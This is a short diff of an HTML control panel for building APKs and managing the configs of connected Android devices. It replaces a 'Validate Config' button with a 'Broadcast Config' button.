@@ -70,10 +70,6 @@
                             <img src="../img/build.png" alt="Build APK">
                             <span id="buildButtonText">Build APK</span>
                         </div>
-                        <div class="section-apk-inline" onclick="validateConfig()" title="Send config validation request to all connected Android devices.">
-                            <img src="../img/build.png" alt="Validate Config">
-                            <span>Validate Config</span>
-                        </div>
                     </div>
                     <div id="buildProgress" class="build-progress" style="display: none;">
                         <div class="progress-bar">
@@ -133,6 +129,7 @@
                                 <div class="config-actions">
                                     <button onclick="setDefaultConfig()" class="config-button save">Save Default Config</button>
                                     <button onclick="loadDefaultConfig()" class="config-button reload">Reload</button>
+                                    <button onclick="broadcastDefaultConfig()" class="config-button broadcast">Broadcast Config</button>
                                 </div>
                             </div>
                         </div>
